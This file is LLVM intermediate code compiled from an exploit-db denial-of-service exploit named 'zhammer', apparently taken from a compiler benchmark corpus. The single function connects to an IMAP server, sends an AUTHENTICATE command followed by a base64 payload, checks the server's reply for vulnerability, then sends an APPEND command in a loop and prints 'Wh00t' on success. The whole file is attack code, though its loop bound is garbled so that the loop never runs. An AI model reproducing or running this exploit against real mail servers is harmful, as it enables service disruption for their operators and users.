; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_3290.c_zhammer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_3290.c_zhammer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }

@.str = private unnamed_addr constant [3 x i8] c"*\00\00", align 1
@BBUF_SIZE = common dso_local global i32 0, align 4
@BUF_SIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [23 x i8] c"+Connecting to %s:%d. \00", align 1
@PORT_IMAPD = common dso_local global i32 0, align 4
@AUTH_CMD = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [23 x i8] c"1 OK Done AUTHENTICATE\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"+Bah not vulnerable\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@APPEND_CMD = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [9 x i8] c"select()\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"+Bah not vulnerable %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"Wh00t\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@RCNT_DELAY = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i8*)* @zhammer to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @zhammer(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  %14 = load i32, i32* @BBUF_SIZE, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %6, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %7, align 8
  %18 = load i32, i32* @BUF_SIZE, align 4
  %19 = zext i32 %18 to i64
  %20 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %9, align 8
  %21 = load i8*, i8** %5, align 8
  %22 = load i8*, i8** %5, align 8
  %23 = call i32 @strlen(i8* %22)
  %24 = add nsw i32 %23, 1
  %25 = call i32 @base64(i8* %21, i8* %17, i32 %24)
  %26 = call i32 @strlen(i8* %17)
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %17, i64 %27
  store i8* %28, i8** %8, align 8
  %29 = load i8*, i8** %8, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %8, align 8
  store i8 13, i8* %29, align 1
  %31 = load i8*, i8** %8, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %8, align 8
  store i8 10, i8* %31, align 1
  %33 = load i8*, i8** %8, align 8
  store i8 0, i8* %33, align 1
  store i32 0, i32* %4, align 4
  br label %34

34:                                               ; preds = %115, %1
  %35 = load i32, i32* %4, align 4
  %36 = icmp slt i32 %35, -1
  br i1 %36, label %37, label %118

37:                                               ; preds = %34
  %38 = load i8*, i8** %2, align 8
  %39 = load i32, i32* @PORT_IMAPD, align 4
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i8* %38, i32 %39)
  %41 = load i8*, i8** %2, align 8
  %42 = load i32, i32* @PORT_IMAPD, align 4
  %43 = call i32 @sockami(i8* %41, i32 %42)
  store i32 %43, i32* %3, align 4
  %44 = load i32, i32* %3, align 4
  %45 = sub i64 %19, 1
  %46 = trunc i64 %45 to i32
  %47 = call i32 @sock_recv(i32 %44, i8* %20, i32 %46)
  store i32 %47, i32* %12, align 4
  %48 = load i32, i32* %12, align 4
  %49 = icmp slt i32 %48, 0
  br i1 %49, label %50, label %51

50:                                               ; preds = %37
  store i32 1, i32* %13, align 4
  br label %119

51:                                               ; preds = %37
  %52 = load i32, i32* %3, align 4
  %53 = load i8*, i8** @AUTH_CMD, align 8
  %54 = load i8*, i8** @AUTH_CMD, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = call i32 @sock_send(i32 %52, i8* %53, i32 %55)
  %57 = load i32, i32* %3, align 4
  %58 = sub i64 %19, 1
  %59 = trunc i64 %58 to i32
  %60 = call i32 @sock_recv(i32 %57, i8* %20, i32 %59)
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %12, align 4
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %64

63:                                               ; preds = %51
  br label %118

64:                                               ; preds = %51
  %65 = load i32, i32* %3, align 4
  %66 = call i32 @strlen(i8* %17)
  %67 = call i32 @sock_send(i32 %65, i8* %17, i32 %66)
  %68 = load i32, i32* %3, align 4
  %69 = sub i64 %19, 1
  %70 = trunc i64 %69 to i32
  %71 = call i32 @sock_recv(i32 %68, i8* %20, i32 %70)
  store i32 %71, i32* %12, align 4
  %72 = load i32, i32* %12, align 4
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %75

74:                                               ; preds = %64
  br label %118

75:                                               ; preds = %64
  %76 = call i32 @strcmp(i8* %20, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %82, label %78

78:                                               ; preds = %75
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  %80 = load i32, i32* @EXIT_SUCCESS, align 4
  %81 = call i32 @exit(i32 %80) #4
  unreachable

82:                                               ; preds = %75
  %83 = load i32, i32* %3, align 4
  %84 = load i8*, i8** @APPEND_CMD, align 8
  %85 = load i8*, i8** @APPEND_CMD, align 8
  %86 = call i32 @strlen(i8* %85)
  %87 = call i32 @sock_send(i32 %83, i8* %84, i32 %86)
  %88 = call i32 @FD_ZERO(i32* %10)
  %89 = load i32, i32* %3, align 4
  %90 = call i32 @FD_SET(i32 %89, i32* %10)
  %91 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i32 2, i32* %91, align 8
  %92 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %92, align 8
  %93 = load i32, i32* %3, align 4
  %94 = add nsw i32 %93, 1
  %95 = call i32 @select(i32 %94, i32* %10, i32* null, i32* null, %struct.timeval* %11)
  store i32 %95, i32* %12, align 4
  %96 = load i32, i32* %12, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %100

98:                                               ; preds = %82
  %99 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  br label %109

100:                                              ; preds = %82
  %101 = load i32, i32* %12, align 4
  %102 = icmp sgt i32 %101, 1
  br i1 %102, label %103, label %108

103:                                              ; preds = %100
  %104 = load i32, i32* %12, align 4
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0), i32 %104)
  %106 = load i32, i32* @EXIT_SUCCESS, align 4
  %107 = call i32 @exit(i32 %106) #4
  unreachable

108:                                              ; preds = %100
  br label %109

109:                                              ; preds = %108, %98
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %111 = load i32, i32* @stdout, align 4
  %112 = call i32 @fflush(i32 %111)
  %113 = load i32, i32* @RCNT_DELAY, align 4
  %114 = call i32 @sleep(i32 %113)
  br label %115

115:                                              ; preds = %109
  %116 = load i32, i32* %4, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %4, align 4
  br label %34

118:                                              ; preds = %74, %63, %34
  store i32 0, i32* %13, align 4
  br label %119

119:                                              ; preds = %118, %50
  %120 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %120)
  %121 = load i32, i32* %13, align 4
  switch i32 %121, label %123 [
    i32 0, label %122
    i32 1, label %122
  ]

122:                                              ; preds = %119, %119
  ret void

123:                                              ; preds = %119
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @base64(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @sock_recv(i32, i8*, i32) #2

declare dso_local i32 @sock_send(i32, i8*, i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @sleep(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
